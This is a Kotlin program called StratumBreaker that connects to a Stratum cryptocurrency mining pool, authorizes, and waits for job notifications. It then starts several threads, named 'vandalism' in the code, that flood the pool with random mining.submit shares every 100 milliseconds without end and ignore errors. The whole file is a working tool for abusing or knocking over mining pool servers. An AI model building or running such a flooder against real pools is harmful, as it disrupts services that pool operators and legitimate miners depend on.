package com.nao20010128nao.StratumBreaker

import com.nao20010128nao.ked.component6
import com.nao20010128nao.ked.component7
import joptsimple.OptionParser
import java.net.URI
import java.security.SecureRandom
import kotlin.concurrent.thread

object Main {
    @JvmStatic
    fun main(args: Array<String>) {
        println("CAUTION FOR USERS: THIS IS NOT A MINER")
        val spec = OptionParser()
        val urlOpt = spec.accepts("url").withRequiredArg()
                .withValuesConvertedBy(Require { it.startsWith("stratum+tcp://") })
        val userOpt = spec.accepts("user").withRequiredArg()
        val passOpt = spec.accepts("pass").withRequiredArg()
        val threadOpt = spec.accepts("threads").withRequiredArg()
                .withValuesConvertedBy(ParseInt).defaultsTo(4)
        val nameOpt = spec.accepts("name").withRequiredArg().defaultsTo("NitroHash")

        val result = spec.parse(*args)

        start(
                result.valueOf(urlOpt),
                result.valueOf(userOpt),
                result.valueOf(passOpt),
                result.valueOf(threadOpt),
                result.valueOf(nameOpt)
        )
    }

    fun start(url: String, user: String?, pass: String?, threads: Int, name: String) {
        var jobId = ""
        var nTime = ""
        val extraNonce2 = "00000002"
        val runningValdalism: MutableList<Thread> = mutableListOf()
        val random = SecureRandom()

        val urlObj = URI(url)
        val rpc = JsonRpc(urlObj.host, urlObj.port)
        fun vandalism(): Thread = thread {
            while (true) {
                try {
                    rpc.send(null, "mining.submit", jsonArrayOf(
                            user.toJsonElementOrNull(),
                            jobId.toJsonElement(),
                            extraNonce2.toJsonElement(),
                            nTime.toJsonElement(),
                            "%08x".format(random.nextInt()).toJsonElement()
                    ))
                } catch (e: Throwable) {
                }
                Thread.sleep(100)
            }
        }.also { runningValdalism.add(it) }

        fun vandalismIfNotStarted() {
            if (runningValdalism.isNotEmpty()) return
            for (i in 1..threads) {
                vandalism()
            }
        }

        val handler = object : JsonRpc.Handler {
            override fun onData(id: Int?, response: JsonRpc.Response) {
                if (response is JsonRpc.Response.Notify) {
                    when (response.method) {
                        "mining.notify" -> {
                            val (jobIdElem, _, _, _, _, _, nTimeElem) = response.content.toList()
                            jobId = jobIdElem.asString
                            nTime = nTimeElem.asString
                            println("Notified")
                            vandalismIfNotStarted()
                        }
                    }
                } else if (response is JsonRpc.Response.Success) {
                    if (response.content.isJsonPrimitive) {
                        try {
                            println("Result: ${response.content.asBoolean}")
                        } catch (e: Throwable) {
                        }
                    }
                } else if (response is JsonRpc.Response.Error) {
                    println("Error: ${response.message}")
                }
            }
        }
        rpc.add(handler)
        rpc.startLoop()
        Thread.sleep(1000)
        rpc.send(1, "mining.subscribe", jsonArrayOf())
        rpc.send(2, "mining.authorize", jsonArrayOf(
                user.toJsonElementOrNull(),
                pass.toJsonElementOrNull()
        ))
    }
}